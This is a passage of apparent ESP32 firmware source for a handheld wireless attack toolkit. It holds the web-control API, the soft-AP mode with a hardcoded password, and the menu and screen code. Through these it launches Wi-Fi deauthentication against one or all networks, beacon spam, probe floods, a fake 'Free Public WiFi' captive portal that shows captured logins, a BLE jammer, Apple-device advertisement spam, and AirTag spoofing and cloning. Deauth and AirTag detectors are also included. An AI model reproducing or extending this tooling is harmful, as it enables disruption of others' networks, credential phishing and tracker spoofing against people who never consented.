  else if (action == "beacon_stop") { beaconStop(); msg = "Beacon stopped"; }
  else if (action == "deauth_start") {
    stopAllTools();
    if (target < 0) deauthStartAll();
    else deauthStart(target);
    msg = "Deauth started";
  }
  else if (action == "deauth_stop") { deauthStop(); msg = "Deauth stopped"; }
  else if (action == "det_start") { stopAllTools(); detStart(); msg = "Detector started"; }
  else if (action == "det_stop") { detStop(); msg = "Detector stopped"; }
  else if (action == "probe_start") {
    stopAllTools();
    if (target < 0 || target >= wifiCount) {
      msg = "Select a Wi-Fi target first (scan + tap)";
    } else {
      probeStart(target);
      msg = String("Probe stress on ") + wifiNets[target].ssid;
    }
  }
  else if (action == "probe_stop") { probeStop(); msg = "Probe stopped"; }
  else if (action == "ble_scan") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
    bleScanStart();
    msg = "BLE scan started (4s)";
  }
  else if (action == "sniff_start") { spoofStop(); sourStop(); jamStop(); airTagStop(); sniffStart(); msg = "Sniff started"; }
  else if (action == "sniff_stop") { sniffStop(); msg = "Sniff stopped"; }
  else if (action == "spoof_start") {
    sniffStop(); sourStop(); jamStop(); airTagStop();
    spoofMode = (uint8_t)mode;
    if (customName.length()) spoofCustomName = customName;
    {
      int p = body.indexOf("\"power\"");
      if (p >= 0) {
        int c = body.indexOf(':', p);
        if (c > 0) spoofPower = (uint8_t)constrain(body.substring(c + 1).toInt(), 0, 9);
      }
      int iv = body.indexOf("\"interval\"");
      if (iv >= 0) {
        int c = body.indexOf(':', iv);
        if (c > 0) spoofInterval = (uint16_t)constrain(body.substring(c + 1).toInt(), 16, 160);
      }
    }
    spoofStart();
    msg = "Spoofer started";
  }
  else if (action == "spoof_stop") { spoofStop(); msg = "Spoofer stopped"; }
  else if (action == "sour_start") {
    sniffStop(); spoofStop(); jamStop(); airTagStop();
    sourSelected = idx;  // -1 = random
    sourStart();
    sourBeginAdvertise();
    msg = "Sour Apple started";
  }
  else if (action == "sour_stop") { sourStop(); msg = "Sour Apple stopped"; }
  else if (action == "jam_start") { sniffStop(); spoofStop(); sourStop(); airTagStop(); jamStart(); msg = "Jammer started"; }
  else if (action == "jam_stop") { jamStop(); msg = "Jammer stopped"; }
  else if (action == "air_det_start") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airSpoofStop();
    airDetStart();
    msg = "AirTag detector started";
  }
  else if (action == "air_det_stop") { airDetStop(); msg = "AirTag detector stopped"; }
  else if (action == "air_start") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airDetStop();
    int atarget = -1;
    int tp = body.indexOf("\"target\"");
    if (tp >= 0) {
      int c = body.indexOf(':', tp);
      if (c > 0) atarget = body.substring(c + 1).toInt();
    }
    if (airTagCount == 0) airTagBeginSpoof();
    else airSpoofStart(atarget);
    msg = "AirTag spoof started";
  }
  else if (action == "air_stop") { airTagStop(); msg = "AirTag stopped"; }
  else msg = "Unknown action";

  webServer.send(200, "application/json",
    String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
}


static void drawWebModeScreen() {
  tft.fillScreen(COL_BG);
  Theme::drawStatusBar("WEB MODE");
  Theme::printCentered("Soft-AP active", 28, COL_OK, 1);
  Theme::printCentered("SSID: ESP32-TYPHON", 48, COL_FG, 1);
  Theme::printCentered("Pass: rgisking", 64, COL_FG, 1);
  Theme::printCentered("http://192.168.4.1", 84, COL_ACCENT, 1);
  Theme::drawFooter("LED ON", "Hold BOOT=Exit");
}

static void setupWebRoutes() {
  webServer.stop();
  webServer.on("/", HTTP_GET, handleWebRoot);
  webServer.on("/api/status", HTTP_GET, handleWebStatus);
  webServer.on("/api", HTTP_POST, handleWebApi);
  webServer.onNotFound(handleWebRoot);
  webServer.begin();
}

static void enterWebMode() {
  if (webMode) return;
  stopAllTools();
  webMode = true;
  webExitRequested = false;
  digitalWrite(STATUS_LED, HIGH);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-TYPHON", "rgisking");
  delay(150);
  setupWebRoutes();
  drawWebModeScreen();
  Serial.println("[WEB] Soft-AP ESP32-TYPHON / rgisking -> http://192.168.4.1");
}

static void exitWebMode() {
  if (!webMode) return;
  stopAllTools();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  digitalWrite(STATUS_LED, LOW);
  webMode = false;
  webExitRequested = false;
  bootHoldStart = 0;
  bootWasDown = false;
  Serial.println("[WEB] Exited Soft-AP mode");
}

static void handleWebClients() {
  if (!webMode) return;
  webServer.handleClient();
  if (webExitRequested) exitWebMode();
}


// ============================================================
//  UI
// ============================================================


UI ui;

const char* const UI::MAIN_ITEMS[] = { "Wi-Fi Tools", "Bluetooth Tools", "About" };
const int UI::MAIN_COUNT = 3;

const char* const UI::WIFI_ITEMS[] = {
  "Wi-Fi Scanner", "Packet Monitor", "Beacon Spammer",
  "Deauth Attack", "Deauth Detector", "Probe Flood", "Captive Portal", "Back"
};
const int UI::WIFI_COUNT = 8;

const char* const UI::BLE_ITEMS[] = {
  "BLE Scanner", "BLE Sniffer", "BLE Spoofer", "Sour Apple",
  "BLE Jammer", "AirTag Tools", "Back"
};
const int UI::BLE_COUNT = 7;

void UI::begin() {
  pinMode(BOOT_BTN, INPUT_PULLUP);
  pinMode(STATUS_LED, OUTPUT);
  digitalWrite(STATUS_LED, LOW);

  Theme::init();
  joystick.begin();
  wifiScanBegin();
  _screen = SCR_MAIN;
  _sel = 0; _top = 0; _dirty = true;
  drawCurrent();
}

void UI::enterScreen(Screen s) {
  pmStop(); beaconStop(); detStop(); deauthStop(); probeStop(); captiveStop();
  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();

  _screen = s;
  _sel = 0; _top = 0; _dirty = true;

  if (s == SCR_WIFI_SCAN)  wifiScanStart();
  if (s == SCR_BLE_SCAN)   bleScanStart();
  if (s == SCR_PACKET_MON) pmStart();
  if (s == SCR_BEACON)     { beaconStop(); }
  if (s == SCR_DEAUTH_DET) detStart();
  if (s == SCR_PROBE)      { probeStop(); }
  if (s == SCR_CAPTIVE)    captiveStart();
  if (s == SCR_BLE_SNIFF)  sniffStart();
  if (s == SCR_BLE_SPOOF)  { spoofStop(); }
  if (s == SCR_SOUR_APPLE) {
    sourStart();
    _sel = (sourSelected < 0) ? 0 : (sourSelected + 1);
    if (_sel >= 6) _top = _sel - 5;
  }
  if (s == SCR_BLE_JAM)    { jamStop(); }
  if (s == SCR_AIRTAG)     { airTagStart(); airMenuSel = 0; }
}

void UI::goBack() {
  pmStop(); beaconStop(); detStop(); deauthStop(); probeStop(); captiveStop();
  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();

  switch (_screen) {
    case SCR_WIFI_MENU: case SCR_BLE_MENU: case SCR_ABOUT:
      enterScreen(SCR_MAIN); break;
    case SCR_WIFI_SCAN: case SCR_PACKET_MON: case SCR_BEACON:
    case SCR_DEAUTH: case SCR_DEAUTH_DET: case SCR_PROBE: case SCR_CAPTIVE:
      enterScreen(SCR_WIFI_MENU); break;
    case SCR_BLE_SCAN: case SCR_BLE_SNIFF: case SCR_BLE_SPOOF:
    case SCR_SOUR_APPLE: case SCR_BLE_JAM: case SCR_AIRTAG:
      enterScreen(SCR_BLE_MENU); break;
    default:
      enterScreen(SCR_MAIN); break;
  }
}

void UI::handleInput(JoyAction a) {
  if (a == JOY_NONE) return;

  // WiFi Scanner
  if (_screen == SCR_WIFI_SCAN) {
    int cnt = wifiScanning ? 0 : wifiCount;
    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; if (_top > _sel) _top = _sel; }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (cnt > 0 && _sel < cnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (!wifiScanning) { wifiScanStart(); _sel = 0; _top = 0; _dirty = true; }
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // BLE Scanner
  if (_screen == SCR_BLE_SCAN) {
    int cnt = bleScanning ? 0 : bleCount;
    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; if (_top > _sel) _top = _sel; }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (cnt > 0 && _sel < cnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (!bleScanning) { bleScanStart(); _sel = 0; _top = 0; _dirty = true; }
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // Deauth Attack – index 0 = ALL, 1..N = single AP
  if (_screen == SCR_DEAUTH) {
    if (deauthRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { deauthStop(); _dirty = true; }
      return;
    }
    int cnt = wifiCount;
    if (cnt == 0) {
      if (a == JOY_BACK || a == JOY_SELECT) goBack();
      return;
    }
    int menuCnt = cnt + 1;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < menuCnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (_sel == 0) deauthStartAll();
      else deauthStart(_sel - 1);
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // Live tools
  if (_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
      _screen == SCR_DEAUTH_DET || _screen == SCR_CAPTIVE) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (_screen == SCR_PACKET_MON) { pmStop(); delay(20); pmStart(); _dirty = true; }
      else if (_screen == SCR_BEACON) {
        if (beaconRunning) beaconStop();
        else if (beaconMode == 1 && wifiCount == 0) { /* need scan */ }
        else beaconStart();
        _dirty = true;
      } else if (_screen == SCR_DEAUTH_DET) {
        deauthCount = 0; detMacSeen = false; _dirty = true;
      }
    } else if (_screen == SCR_BEACON && !beaconRunning &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      beaconMode = beaconMode ? 0 : 1;
      _dirty = true;
    } else if (_screen == SCR_DEAUTH_DET &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      detMainOnly = !detMainOnly;
      detCh = 1;
      esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
      _dirty = true;
    }
    return;
  }

  // Probe stress – pick AP then flood
  if (_screen == SCR_PROBE) {
    if (probeRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { probeStop(); _dirty = true; }
      return;
    }
    if (a == JOY_BACK) { goBack(); return; }
    if (wifiCount <= 0) return;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < wifiCount - 1) { _sel++; if (_sel >= _top + 6) _top = _sel - 5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      probeStart(_sel);
      _dirty = true;
    }
    return;
  }

  // BLE Sniffer / Spoofer
  if (_screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (_screen == SCR_BLE_SNIFF) {
        sniffStop(); delay(20); sniffStart(); _dirty = true;
      } else if (_screen == SCR_BLE_SPOOF) {
        if (spoofRunning) spoofStop();
        else if (spoofMode == 4 && bleCount == 0) { /* need BLE scan */ }
        else spoofStart();
        _dirty = true;
      }
    } else if (_screen == SCR_BLE_SPOOF && !spoofRunning &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      spoofMode = (spoofMode + 1) % 6;
      _dirty = true;
    }
    return;
  }

  // Sour Apple – list selector + run (item 0 = Random Mix)
  if (_screen == SCR_SOUR_APPLE) {
    const int sourMenuCount = APPLE_LIST_COUNT + 1;  // + Random Mix
    if (sourRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { sourStop(); _dirty = true; }
      return;
    }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < sourMenuCount-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      sourSelected = (_sel == 0) ? -1 : (_sel - 1);  // -1 = random mix
      sourBeginAdvertise();
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // BLE Jammer
  if (_screen == SCR_BLE_JAM) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (jamRunning) jamStop(); else jamStart();
      _dirty = true;
    }
    return;
  }

  // AirTag Tools
  if (_screen == SCR_AIRTAG) {
    if (airDetRunning || airSpoofRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { airTagStop(); airTagMode = 0; _dirty = true; }
      return;
    }
    if (a == JOY_UP) { if (airMenuSel > 0) { airMenuSel--; _dirty = true; } return; }
    if (a == JOY_DOWN) { if (airMenuSel < 2) { airMenuSel++; _dirty = true; } return; }
    if (a == JOY_SELECT) {
      if (airMenuSel == 0) { airDetStart(); _dirty = true; }
      else if (airMenuSel == 1) {
        if (airTagCount == 0) airTagBeginSpoof();
        else airSpoofStart(-1);
        _dirty = true;
      }
      else if (airMenuSel == 2) {
        if (airTagCount > 0) { airSpoofStart(0); _dirty = true; }
      }
      return;
    }
    if (a == JOY_BACK) goBack();
    return;
  }

  // Menus
  int count = 0;
  switch (_screen) {
    case SCR_MAIN: count = MAIN_COUNT; break;
    case SCR_WIFI_MENU: count = WIFI_COUNT; break;
    case SCR_BLE_MENU: count = BLE_COUNT; break;
    default: count = 1; break;
  }

  if (a == JOY_UP || a == JOY_HOLD_UP) {
    if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
  } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
    if (_sel < count-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
  } else if (a == JOY_SELECT) {
    if (_screen == SCR_MAIN) {
      if (_sel == 0) enterScreen(SCR_WIFI_MENU);
      else if (_sel == 1) enterScreen(SCR_BLE_MENU);
      else if (_sel == 2) enterScreen(SCR_ABOUT);
    } else if (_screen == SCR_WIFI_MENU) {
      if (_sel == 0) enterScreen(SCR_WIFI_SCAN);
      else if (_sel == 1) enterScreen(SCR_PACKET_MON);
      else if (_sel == 2) enterScreen(SCR_BEACON);
      else if (_sel == 3) enterScreen(SCR_DEAUTH);
      else if (_sel == 4) enterScreen(SCR_DEAUTH_DET);
      else if (_sel == 5) enterScreen(SCR_PROBE);
      else if (_sel == 6) enterScreen(SCR_CAPTIVE);
      else if (_sel == 7) goBack();
    } else if (_screen == SCR_BLE_MENU) {
      if (_sel == 0) enterScreen(SCR_BLE_SCAN);
      else if (_sel == 1) enterScreen(SCR_BLE_SNIFF);
      else if (_sel == 2) enterScreen(SCR_BLE_SPOOF);
      else if (_sel == 3) enterScreen(SCR_SOUR_APPLE);
      else if (_sel == 4) enterScreen(SCR_BLE_JAM);
      else if (_sel == 5) enterScreen(SCR_AIRTAG);
      else if (_sel == 6) goBack();
    } else if (_screen == SCR_ABOUT) goBack();
  } else if (a == JOY_BACK) goBack();
}

static void drawStubScreen(const char* title, const char* line1, const char* line2 = nullptr) {
  Theme::drawStatusBar(title);
  Theme::printCentered(line1, 48, COL_WARN, 1);
  if (line2) Theme::printCentered(line2, 64, COL_DIM, 1);
  Theme::drawFooter(nullptr, "Btn = Back");
}

void UI::drawWifiScanScreen() {
  Theme::drawStatusBar("Wi-Fi Scan");
  if (wifiScanning) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::printCentered("Please wait", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  static const char* ssids[WIFI_MAX_NETS];
  static int32_t rssis[WIFI_MAX_NETS];
  for (int i = 0; i < wifiCount; i++) {
    ssids[i] = wifiNets[i].ssid.c_str();
    rssis[i] = wifiNets[i].rssi;
  }
  Theme::drawWifiList(ssids, rssis, wifiCount, _sel, _top);
  char left[20];
  snprintf(left, sizeof(left), "%d nets", wifiCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

void UI::drawBleScanScreen() {
  Theme::drawStatusBar("BLE Scan");
  if (bleScanning) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::printCentered("4 seconds", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  static const char* names[BLE_MAX_DEVS];
  static int32_t rssis[BLE_MAX_DEVS];
  for (int i = 0; i < bleCount; i++) {
    names[i] = bleDevs[i].name.c_str();
    rssis[i] = bleDevs[i].rssi;
  }
  Theme::drawWifiList(names, rssis, bleCount, 0, 0);  // no interactive sel for continuous sniff
  char left[20];
  snprintf(left, sizeof(left), "%d devs", bleCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

static void drawPacketMonitor() {
  Theme::drawStatusBar("Packet Mon");
  const int baseY = 100, maxH = 70, barW = 8, gap = 2, startX = 6;
  uint16_t mx = 1;
  for (int i = 0; i < 14; i++) if (pktCount[i] > mx) mx = pktCount[i];
  for (int i = 0; i < 14; i++) {
    int h = (pktCount[i] * maxH) / mx;
    if (h < 1 && pktCount[i] > 0) h = 1;
    int x = startX + i * (barW + gap);
    tft.fillRect(x, baseY - maxH, barW, maxH, 0x1082);
    uint16_t col = (i + 1 == pmChannel) ? COL_ACCENT : COL_OK;
    if (h > 0) tft.fillRect(x, baseY - h, barW, h, col);
    if (i == 0 || i == 5 || i == 10 || i == 13) {
      tft.setTextColor(COL_DIM, COL_BG);
      tft.setCursor(x, baseY + 2);
      tft.print(i + 1);
    }
  }
  char buf[28];
  snprintf(buf, sizeof(buf), "Ch%d  %lu pkts", pmChannel, (unsigned long)pktTotal);
  Theme::drawFooter(buf, "Sel=Reset");
}

static void drawBeaconScreen() {
  Theme::drawStatusBar("Beacon Spam");
  if (beaconRunning) {
    Theme::printCentered("RUNNING", 32, COL_OK, 1);
    char buf[32];
    if (beaconMode == 1 && wifiCount > 0)
      snprintf(buf, sizeof(buf), "%.16s", wifiNets[beaconCloneIdx].ssid.c_str());
    else
      snprintf(buf, sizeof(buf), "%.16s", beaconSSIDs[beaconIdx]);
    Theme::printCentered(buf, 48, COL_FG, 1);
    snprintf(buf, sizeof(buf), "CH%d %lu", beaconCh, (unsigned long)beaconSent);
    Theme::printCentered(buf, 64, COL_DIM, 1);
    Theme::printCentered(beaconMode ? "CLONE" : "LIST", 80, COL_ACCENT, 1);
  } else {
    Theme::printCentered(beaconMode ? "Mode: CLONE" : "Mode: LIST", 40, COL_TITLE, 1);
    if (beaconMode && wifiCount == 0)
      Theme::printCentered("Scan WiFi first!", 58, COL_WARN, 1);
    else
      Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawDeauthDetScreen() {
  Theme::drawStatusBar("Deauth Detect");
  char buf[28];
  snprintf(buf, sizeof(buf), "%lu  CH%d %s",
           (unsigned long)deauthCount, detCh, detMainOnly ? "M" : "A");
  Theme::printCentered(buf, 28, COL_FG, 1);
  if (detMacSeen) {
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             detLastMac[0], detLastMac[1], detLastMac[2],
             detLastMac[3], detLastMac[4], detLastMac[5]);
    Theme::printCentered(buf, 46, COL_ACCENT, 1);
    snprintf(buf, sizeof(buf), "CH%d  %d dBm", detLastCh, (int)detLastRssi);
    Theme::printCentered(buf, 62, COL_DIM, 1);
  } else {
    Theme::printCentered("Waiting...", 50, COL_DIM, 1);
  }
  Theme::drawFooter("L/R=Mode", "Sel=Reset");
}

static void drawDeauthScreen(int sel, int top) {
  Theme::drawStatusBar("Deauth Attack");
  if (deauthRunning) {
    Theme::printCentered("ATTACKING", 36, COL_ERR, 1);
    if (deauthTarget == -2) {
      Theme::printCentered("ALL NETWORKS", 54, COL_FG, 1);
    } else if (deauthTarget >= 0 && deauthTarget < wifiCount) {
      char s[18];
      const char* src = wifiNets[deauthTarget].ssid.c_str();
      int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
      if (src[n]) s[n++] = '.'; s[n] = 0;
      Theme::printCentered(s, 54, COL_FG, 1);
    }
    char buf[24];
    snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)deauthSent);
    Theme::printCentered(buf, 72, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (wifiCount == 0) {
    Theme::printCentered("No scan data", 50, COL_WARN, 1);
    Theme::printCentered("Scan first", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  } else {
    static const char* items[WIFI_MAX_NETS + 1];
    items[0] = ">> ALL NETWORKS <<";
    for (int i = 0; i < wifiCount; i++) items[i + 1] = wifiNets[i].ssid.c_str();
    Theme::drawMenuList(items, wifiCount + 1, sel, top, 18, 14);
    Theme::drawFooter("Pick target", "Sel=Start");
  }
}

static void drawProbeScreen() {
  Theme::drawStatusBar("Probe Stress");
  char buf[28];
  if (probeRunning) {
    Theme::printCentered("STRESSING", 28, COL_ERR, 1);
    if (probeTarget >= 0 && probeTarget < wifiCount) {
      char s[18];
      const char* src = wifiNets[probeTarget].ssid.c_str();
      int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
      s[n] = 0;
      Theme::printCentered(s, 46, COL_FG, 1);
      snprintf(buf, sizeof(buf), "CH%d  %lu", probeCh, (unsigned long)probeSent);
      Theme::printCentered(buf, 64, COL_DIM, 1);
    }
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (wifiCount == 0) {
    Theme::printCentered("No scan data", 50, COL_WARN, 1);
    Theme::printCentered("Scan Wi-Fi first", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  } else {
    static const char* items[WIFI_MAX_NETS];
    for (int i = 0; i < wifiCount; i++) items[i] = wifiNets[i].ssid.c_str();
    Theme::drawMenuList(items, wifiCount, _sel, _top, 18, 14);
    Theme::drawFooter("Pick AP", "Sel=Start");
  }
}

static void drawCaptiveScreen() {
  Theme::drawStatusBar("Captive Portal");
  Theme::printCentered("Free Public WiFi", 28, COL_TITLE, 1);
  char buf[28];
  snprintf(buf, sizeof(buf), "Clients:%lu Hits:%lu",
           (unsigned long)captiveClients, (unsigned long)captiveHits);
  Theme::printCentered(buf, 46, COL_FG, 1);
  if (captiveLastUser[0]) {
    Theme::printCentered(captiveLastUser, 64, COL_ACCENT, 1);
    Theme::printCentered(captiveLastPass[0] ? captiveLastPass : "(pass)", 80, COL_DIM, 1);
  } else {
    Theme::printCentered("Waiting for login...", 68, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}


static void drawBleSniffScreen() {
  Theme::drawStatusBar("BLE Sniffer");
  if (bleScanning && bleCount == 0) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  static const char* names[BLE_MAX_DEVS];
  static int32_t rssis[BLE_MAX_DEVS];
  for (int i = 0; i < bleCount; i++) {
    names[i] = bleDevs[i].name.c_str();
    rssis[i] = bleDevs[i].rssi;
  }
  Theme::drawWifiList(names, rssis, bleCount, 0, 0);  // no interactive sel for continuous sniff
  char left[20];
  snprintf(left, sizeof(left), "%d devs", bleCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

static void drawBleSpoofScreen() {
  Theme::drawStatusBar("BLE Spoofer");
  if (spoofRunning) {
    Theme::printCentered("ADVERTISING", 36, COL_OK, 1);
    {
      const char* mn = "APPLE";
      if (spoofMode == 1) mn = "SAMSUNG";
      else if (spoofMode == 2) mn = "GOOGLE";
      else if (spoofMode == 3) mn = "NAMES";
      else if (spoofMode == 4) mn = "CLONE";
      else if (spoofMode == 5) mn = "CUSTOM";
      Theme::printCentered(mn, 52, COL_FG, 1);
    }
    Theme::printCentered("rotating...", 68, COL_DIM, 1);
  } else {
    Theme::printCentered("Mode cycle: press SEL", 40, COL_TITLE, 1);
    if (spoofMode == 4 && bleCount == 0)
      Theme::printCentered("BLE Scan first!", 58, COL_WARN, 1);
    else
      Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawSourAppleList(int sel, int top) {
  Theme::drawStatusBar("Sour Apple");
  if (sourRunning) {
    Theme::printCentered("SPAMMING", 36, COL_OK, 1);
    const char* nm = (sourSelected < 0) ? "Random Mix" : appleList[sourSelected].name;
    Theme::printCentered(nm, 52, COL_FG, 1);
    char buf[28];
    snprintf(buf, sizeof(buf), "%lu pkts", (unsigned long)sourSent);
    Theme::printCentered(buf, 68, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
    return;
  }
  static const char* names[40];
  names[0] = "Random Mix";
  for (int i = 0; i < APPLE_LIST_COUNT && i < 39; i++) names[i+1] = appleList[i].name;
  Theme::drawMenuList(names, APPLE_LIST_COUNT + 1, sel, top, 18, 14);
  Theme::drawFooter("Pick type", "Sel=Start");
}

static void drawJamScreen() {
  Theme::drawStatusBar("BLE Jammer");
  if (jamRunning) {
    Theme::printCentered("FLOODING", 40, COL_ERR, 1);
    char buf[24];
    snprintf(buf, sizeof(buf), "%lu advs", (unsigned long)jamCount);
    Theme::printCentered(buf, 60, COL_FG, 1);
  } else {
    Theme::printCentered("STOPPED", 50, COL_WARN, 1);
    Theme::printCentered("Sel = Start", 70, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawAirTagScreen() {
  Theme::drawStatusBar("AirTag Tools");
  char buf[28];
  if (airDetRunning) {
    Theme::printCentered("DETECTING", 28, COL_ACCENT, 1);
    snprintf(buf, sizeof(buf), "Found %d", airTagCount);
    Theme::printCentered(buf, 48, COL_FG, 1);
    if (airTagCount > 0) {
      snprintf(buf, sizeof(buf), "%.12s %ddBm", airTags[0].name, (int)airTags[0].rssi);
      Theme::printCentered(buf, 64, COL_DIM, 1);
    } else {
      Theme::printCentered("Scanning BLE...", 64, COL_DIM, 1);
    }
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (airSpoofRunning) {
    Theme::printCentered("SPOOFING", 28, COL_ERR, 1);
    if (airSpoofTarget < 0) Theme::printCentered("Spam all", 44, COL_FG, 1);
    else Theme::printCentered("Clone one", 44, COL_FG, 1);
    snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)airTagSent);
    Theme::printCentered(buf, 60, COL_DIM, 1);
    snprintf(buf, sizeof(buf), "%d captured", airTagCount);
    Theme::printCentered(buf, 74, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else {
    // Menu: Detect / Spam all / Clone first
    const char* items[] = { "Detect AirTags", "Spam all / synth", "Clone first hit" };
    for (int i = 0; i < 3; i++) {
      char line[28];
      snprintf(line, sizeof(line), "%s %s", (i == uiSelAir()) ? ">" : " ", items[i]);
      Theme::printCentered(line, 32 + i * 14, (i == uiSelAir()) ? COL_ACCENT : COL_FG, 1);
    }
    snprintf(buf, sizeof(buf), "Saved: %d", airTagCount);
    Theme::printCentered(buf, 80, COL_DIM, 1);
    Theme::drawFooter("Up/Dn", "Sel / L-Back");
  }
}



void UI::drawCurrent() {

  Theme::clear();
  switch (_screen) {
    case SCR_MAIN:
      Theme::drawStatusBar("ESP32-DIV", false);
      Theme::drawMenuList(MAIN_ITEMS, MAIN_COUNT, _sel, _top);
      Theme::drawFooter("Joy: Nav", "Btn: Select");
      break;
    case SCR_WIFI_MENU:
      Theme::drawStatusBar("Wi-Fi Tools");
      Theme::drawMenuList(WIFI_ITEMS, WIFI_COUNT, _sel, _top);
      Theme::drawFooter("Up/Dn", "Sel / L-Back");
      break;
    case SCR_BLE_MENU:
      Theme::drawStatusBar("Bluetooth");
      Theme::drawMenuList(BLE_ITEMS, BLE_COUNT, _sel, _top);
      Theme::drawFooter("Up/Dn", "Sel / L-Back");
      break;
    case SCR_WIFI_SCAN:   drawWifiScanScreen(); break;
    case SCR_BLE_SCAN:    drawBleScanScreen(); break;
    case SCR_PACKET_MON:  drawPacketMonitor(); break;
    case SCR_BEACON:      drawBeaconScreen(); break;
    case SCR_DEAUTH_DET:  drawDeauthDetScreen(); break;
    case SCR_DEAUTH:      drawDeauthScreen(_sel, _top); break;
    case SCR_PROBE:       drawProbeScreen(); break;
    case SCR_CAPTIVE:     drawCaptiveScreen(); break;
    case SCR_BLE_SNIFF:   drawBleSniffScreen(); break;
    case SCR_BLE_SPOOF:   drawBleSpoofScreen(); break;
    case SCR_SOUR_APPLE:  drawSourAppleList(_sel, _top); break;
    case SCR_BLE_JAM:     drawJamScreen(); break;
    case SCR_AIRTAG:      drawAirTagScreen(); break;
    case SCR_ABOUT:
      Theme::drawStatusBar("About");
      Theme::printCentered("ESP32-DIV Port", 36, COL_TITLE, 1);
      Theme::printCentered("ST7735 160x128", 52, COL_FG, 1);
      Theme::printCentered("WiFi + BLE", 68, COL_DIM, 1);
      Theme::printCentered("Joystick UI", 84, COL_DIM, 1);
      Theme::drawFooter(nullptr, "Btn = Back");
      break;
    default:
